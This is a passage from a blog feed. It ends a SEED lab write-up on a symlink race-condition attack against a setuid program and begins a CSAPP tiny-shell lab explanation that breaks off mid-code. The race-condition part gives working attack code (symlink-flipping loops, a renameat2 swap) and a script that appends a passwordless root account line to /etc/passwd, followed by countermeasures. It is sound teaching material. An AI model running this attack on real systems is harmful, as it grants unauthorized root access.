特权的新用户帐户，且不需输入密码直接回车即可，验证确实如此</p><h1 id="Task-2-Launching-the-Race-Condition-Attack"><a href="#Task-2-Launching-the-Race-Condition-Attack" class="headerlink" title="Task 2: Launching the Race Condition Attack"></a>Task 2: Launching the Race Condition Attack</h1><h2 id="Task-2-A-Simulating-a-Slow-Machine"><a href="#Task-2-A-Simulating-a-Slow-Machine" class="headerlink" title="Task 2.A: Simulating a Slow Machine"></a>Task 2.A: Simulating a Slow Machine</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span>* fn = <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>;<br>    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">60</span>];<br>    FILE* fp;<br><br>    <span class="hljs-comment">/* get user input */</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%50s&quot;</span>, buffer);<br><br>    <span class="hljs-keyword">if</span> (!access(fn, W_OK)) &#123;<br>    sleep(<span class="hljs-number">10</span>);<br>        fp = fopen(fn, <span class="hljs-string">&quot;a+&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!fp) &#123;<br>            perror(<span class="hljs-string">&quot;Open failed&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        fwrite(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-number">1</span>, fp);<br>        fwrite(buffer, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-built_in">strlen</span>(buffer), fp);<br>        fclose(fp);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No permission \n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>编译上面程序为root所有的4755权限的可执行程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">[11/01/22]seed@VM:~/.../Labsetup$ ln -sf /dev/null /tmp/XYZ<br>[11/01/22]seed@VM:~/.../Labsetup$ a.out <br>test:U6aMy0wojraho:0:0:test:/root:/bin/bash<br>[11/01/22]seed@VM:~/.../Labsetup$ ln -sf /etc/passwd /tmp/XYZ<br></code></pre></td></tr></table></figure><p>攻击成功，可以su test无密码登录</p><h2 id="Task-2-B-The-Real-Attack"><a href="#Task-2-B-The-Real-Attack" class="headerlink" title="Task 2.B: The Real Attack"></a>Task 2.B: The Real Attack</h2><p>注释掉上面程序的sleep语句，在一个更加贴合正常情境进行攻击</p><p>有三个程序：</p><ul><li>vulp。被注释掉sleep的setuid程序，也是我们攻击的对象</li><li>attack。不停的更改软链接的指向</li><li>target_process.sh。不停的执行vulp程序，直到vulp成功被攻击，也即是/etc/passwd文件中被追加一行<code>test:U6aMy0wojraho:0:0:test:/root:/bin/bash</code></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>CHECK_FILE=&quot;ls -l /etc/passwd&quot;<br>old=$($CHECK_FILE)<br>new=$($CHECK_FILE)<br>while [ &quot;$old&quot; == &quot;$new&quot; ]  <br>do<br>   echo &quot;test:U6aMy0wojraho:0:0:test:/root:/bin/bash&quot; | ./vulp <br>   new=$($CHECK_FILE)<br>done<br>echo &quot;STOP... The passwd file has been changed&quot;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;unistd.h&gt;</span> </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123; <br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123; <br>unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); <br>symlink(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); <br>usleep(<span class="hljs-number">100</span>); <br>unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); <br>symlink(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); <br>usleep(<span class="hljs-number">100</span>); <br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br><br></code></pre></td></tr></table></figure><p>/tmp/XYZ每一百毫秒更改一次指向，在指向/dev/null和/etc/passwd之间左右横跳</p><p><img src="/image/Snipaste_2022-11-02_16-30-22.png"></p><p>在一个shell中运行target_process.sh，另一个shell中运行attack，在几秒内即可攻击成功，发现/etc/passwd中追加了一行<code>test:U6aMy0wojraho:0:0:test:/root:/bin/bash </code></p><h2 id="Task-2-C-An-Improved-Attack-Method"><a href="#Task-2-C-An-Improved-Attack-Method" class="headerlink" title="Task 2.C: An Improved Attack Method"></a>Task 2.C: An Improved Attack Method</h2><p>上面的attack.c程序具有竞争条件漏洞，因为当access之后，open之前可能会unlink一下，然后open之后/tmp/xyz就会成为一个root所有的程序，此后攻击程序将无法再更改/tmp/xyz</p><blockquote><p><code>/tmp</code> 文件夹有一个“粘性”位，此目录下的文件的所有者才能删除该文件</p></blockquote><p>改良后的attack.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags = RENAME_EXCHANGE;<br>    unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); symlink(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br>    unlink(<span class="hljs-string">&quot;/tmp/ABC&quot;</span>); symlink(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;/tmp/ABC&quot;</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>    renameat2(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;/tmp/ABC&quot;</span>, flags);<br>&#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure><p>新程序使用renameat2系统调用自动切换链接指向，这允许我们在不引入任何竞态条件的情况下更改/tmp/XYZ 指向的内容</p><p>重复task2B操作，攻击成功</p><h1 id="Task-3-Countermeasures"><a href="#Task-3-Countermeasures" class="headerlink" title="Task 3: Countermeasures"></a>Task 3: Countermeasures</h1><h2 id="Task-3-A-Applying-the-Principle-of-Least-Privilege"><a href="#Task-3-A-Applying-the-Principle-of-Least-Privilege" class="headerlink" title="Task 3.A: Applying the Principle of Least Privilege"></a>Task 3.A: Applying the Principle of Least Privilege</h2><p>最小特权原则：使用 seteuid 系统调用暂时禁用 root 权限，然后在必要时启用它</p><blockquote><p>在执行易受攻击的函数之前，我们禁用特权; 在易受攻击的函数返回之后，我们重新启用该特权</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">uid_t</span> uid = getuid(); <span class="hljs-comment">//真实用户id</span><br><span class="hljs-keyword">uid_t</span> euid = geteuid();<span class="hljs-comment">//有效用户id，如果是setuid程序那么会具有root权限 </span><br>seteuid(uid); <br><br><span class="hljs-comment">/* 执行不需要root特权的操作 */</span><br><br>seteuid(euid); <br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Task-3-B-Using-Ubuntu’s-Built-in-Scheme"><a href="#Task-3-B-Using-Ubuntu’s-Built-in-Scheme" class="headerlink" title="Task 3.B: Using Ubuntu’s Built-in Scheme"></a>Task 3.B: Using Ubuntu’s Built-in Scheme</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">// On Ubuntu 16.04 and 20.04, use the following command:<br><span class="hljs-meta">$</span><span class="bash"> sudo sysctl -w fs.protected_symlinks=1</span><br>// On Ubuntu 12.04, use the following command:<br><span class="hljs-meta">$</span><span class="bash"> sudo sysctl -w kernel.yama.protected_sticky_symlinks=1</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-lab：shell lab</title>
    <link href="/p/219af9ac/"/>
    <url>/p/219af9ac/</url>
    
    <content type="html"><![CDATA[<h1 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h1><p>此次实验的目的是做一个tiny shell，<strong>实现的tsh有以下要求：</strong></p><ul><li>提示符应该是字符串“ tsh &gt;”</li><li>用户键入的命令行应该由一个名称和零个或多个参数组成，所有这些参数都由一个或多个空格隔开。如果 name 是一个内置命令，那么 tsh 应该立即处理它并等待下一个命令行。否则，tsh 应该假定 name 是一个可执行文件的路径，它在初始子进程的上下文中加载和运行该文件(在此上下文中，术语 job 指的是这个初始子进程)</li><li>tsh 不需要支持管道(|)或 I/O 重定向(&lt; 和 &gt;)</li><li>键入 ctrl-c (ctrl-z)会导致 SIGINT (SIGTSTP)信号被发送到当前的前台作业，以及该作业的任何子进程(例如，它fork的任何子进程)。如果没有前台作业，那么信号应该没有效果</li><li>如果命令行以 &amp; 结尾，那么 tsh 应该在后台运行作业。否则，它应该在前台运行作业</li><li>每个作业可以通过进程 ID (PID)或作业 ID (JID)来标识，JID 是由 tsh 分配的正整数。JID 应该在命令行中用前缀“%”表示。例如，“% 5”表示 JID5，而“5”表示 PID 5</li><li>tsh 应该支持以下内置命令<ul><li>quit 终止shell</li><li>jobs 列出所有后台任务</li><li>bg &lt; job &gt; 命令重启 &lt; job &gt; ，发送一个 SIGCONT 信号，然后在<strong>后台</strong>运行它。&lt; job &gt; 参数可以是 PID 或 JID</li><li>fg &lt; job &gt; 命令重启 &lt; job &gt; ，发送一个 SIGCONT 信号 ，然后在<strong>前台</strong>运行它。&lt; job &gt; 参数可以是 PID 或 JID</li></ul></li><li>tsh 应该reap它所有的僵尸子进程。如果任何作业因为接收到未捕获的信号而终止，那么 tsh 应该识别此事件，并使用作业的 PID 和违规信号的描述打印消息</li></ul><p>每次修改 tsh.c 文件时，键入 make 以重新编译</p><p>要运行 shell，需要在命令行中键入 ./tsh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">unix&gt;</span><span class="bash"> ./tsh</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">tsh&gt;</span><span class="bash"> [<span class="hljs-built_in">type</span> commands to your shell here]</span><br></code></pre></td></tr></table></figure><p>关于shell：</p><ul><li><p>命令行是由空格分隔的 ASCII 文本单词序列。命令行中的第一个单词是内置命令的名称或可执行文件的路径名。其余的单词是命令行参数。如果第一个单词是内置命令，则 shell 将立即在当前进程中执行该命令。否则，该单词被假定为可执行程序的路径名。在这种情况下，shell 分支一个子进程，然后在子进程的上下文中加载并运行程序。由于解释单个命令行而创建的子进程统称为作业。通常，一个作业可以由多个子进程组成，这些子进程由 Unix 管道连接。</p></li><li><p>如果命令行以“ &amp;”结尾，那么作业将在后台运行，这意味着 shell 在打印提示符并等待下一个命令行之前不会等待作业终止。否则，作业将在前台运行，这意味着 shell 在等待下一个命令行之前等待作业终止。因此，在任何时候，最多只能有一个作业在前台运行。但是，任意数量的作业都可以在后台运行。例如，键入命令行</p></li><li><p>Unix shell 支持作业控制的概念，允许用户在后台和前台之间来回移动作业，并更改作业中进程的进程状态(运行、停止或终止)。键入 ctrl-c 会将 SIGINT 信号传递给前台作业中的每个进程。SIGINT 的默认操作是终止进程。类似地，键入 ctrl-z 将导致 SIGTSTP 信号传递到前台作业中的每个进程。SIGTSTP 的默认操作是将进程置于已停止状态，直到收到 SIGCONT 信号将其唤醒为止。UnixShell 还提供各种支持作业控制的内置命令。例如:</p></li></ul><blockquote><p>• jobs: List the running and stopped background jobs.<br>• bg &lt;job&gt;: Change a stopped background job to a running background job.<br>• fg &lt;job&gt;: Change a stopped or running background job to a running in the foreground.<br>• kill &lt;job&gt;: Terminate a job.</p></blockquote><p>我们需要完成tsh.c文件下面的函数以实现shell的功能</p><blockquote><p>• eval: Main routine that parses and interprets the command line. [70 lines]<br>• builtin cmd: Recognizes and interprets the built-in commands: quit, fg, bg, and jobs. [25 lines]<br>• do bgfg: Implements the bg and fg built-in commands. [50 lines]<br>• waitfg: Waits for a foreground job to complete. [20 lines]<br>• sigchld handler: Catches SIGCHILD signals. 80 lines]<br>• sigint handler: Catches SIGINT (ctrl-c) signals. [15 lines]<br>• sigtstp handler: Catches SIGTSTP (ctrl-z) signals. [15 lines]</p></blockquote><p>builtin_cmd需要处理以下<strong>内置命令</strong>：</p><ul><li>quit</li><li>jobs</li><li>bg</li><li>fg</li></ul><h1 id="程序执行流"><a href="#程序执行流" class="headerlink" title="程序执行流"></a>程序执行流</h1><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><p>调用了signal函数进行了信号的自定义安装</p><p>进入while无限循环</p><ul><li>输出命令提示符</li><li>然后进行了命令行字符串的读取，如果不成功或者eof也进行了处理</li><li>调用eval函数对输入的命令进行处理</li></ul><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><blockquote><p>eval的实现可以参考PPT和csapp P543的内容</p><p><code>eval</code>中进程在<code>fork</code>之前用<code>sigprocmask</code>阻塞<code>SIGCHLD</code>信号，之后在解除信号阻塞，之后在调用<code>addjob</code>添加孩子到作业列表用<code>sigprocmask</code>阻塞信号，因为子继承继承父进程的阻塞集合，所以子程序必须确保在执行新进程前解除阻塞<code>SIGCHLD</code>信号。父进程需以这种方式阻塞<code>SIGCHLD</code>信号，避免在父进程调用<code>addjob</code>之前，<code>SIGCHLD</code>处理器获取子进程(从而从任务列表中删除)的竞争状态</p></blockquote><ul><li>调用parseline对输入的命令cmdline进行处理，将命令行解析后的结果放到argv中，parseline最终返回值为是否在后台运行</li><li>调用builtin_cmd函数，builtin_cmd内部需要处理以下<strong>内置命令</strong>：quit，jobs，bg，fg，使用strcmp函数进行字符串的比较，并分别进行处理，如果不是内置命令说明要fork出子进程进行处理</li><li>由于父子进程的执行顺序是不固定的，有可能子进程的执行先于父进程，那么会造成竞争条件的问题，使程序出现bug。所以这里需要信号屏蔽的一些操作<ul><li>父进程先阻塞SIGCHLD信号，然后执行fork函数。如果返回值为0，说明是子进程，子进程需要使用Sigprocmask(SIG_SETMASK, &amp;prev_one, NULL); 解除SIGCHLD的阻塞，之后使用Setpgid(0,0);设置pgid为子进程的pid，并用execve执行程序</li><li>如果返回值不是0，说明是父进程，父进程在addjob的时候由于要防止竞争条件问题，因此在addjob函数前后需要信号的阻塞与还原</li><li>父进程判断是前台任务还使后台任务，如果是前台任务那么需要等待前台任务执行完成才可以操作，这里相当于被阻塞了，因此如果判断是前台任务那么需要调用waitfg函数，参考lab指导书的hint可以使用while循环一直获取前台id的值，如果是0说明没有前台任务，如果不是0的话说明有前台任务，使用线程安全的usleep函数等待，相当于实现了wait</li></ul></li></ul><h2 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h2><p>要求：</p><ul><li>bg &lt; job &gt; 命令重启 &lt; job &gt; ，发送一个 SIGCONT 信号，然后在<strong>后台</strong>运行它。&lt; job &gt; 参数可以是 PID 或 JID</li><li>fg &lt; job &gt; 命令重启 &lt; job &gt; ，发送一个 SIGCONT 信号 ，然后在<strong>前台</strong>运行它。&lt; job &gt; 参数可以是 PID 或 JID</li><li>报错处理：比如格式不正确或者虽然格式正确但是没有此进程 / job</li></ul><p>对于重启的实现，可以使用kill函数的sigcont参数，hint提示在使用-pid而非pid</p><p>改变job的状态，直接对job-&gt;state赋值即可</p><p>如果是前台运行，那么需要调用waitfg函数进行阻塞</p><h2 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h2><p>SIGCHLD：当父进程的某一子进程终止（或者因为调用了 exit()，或者因为被信号杀死）时，（内核）将向父进程发送该信号</p><p>为了防止竞争条件和信号默认不排队，在sigchld_handler函数中delete前后需要对信号掩码进行操作</p><p>sigchld_handler需要包含对进程的回收，这里使用while循环，防止有信号没有处理的情况</p><h2 id="sigint-handler"><a href="#sigint-handler" class="headerlink" title="sigint_handler"></a>sigint_handler</h2><p>sigint指的是使用ctrl+c对进程发出中断信号，这时候需要使用Kill(-fg,sig);对前台进程发出中断信号</p><h2 id="sigtstp-handler"><a href="#sigtstp-handler" class="headerlink" title="sigtstp_handler"></a>sigtstp_handler</h2><p>使用Kill(-fg,sig);对前台进程进行挂起</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span 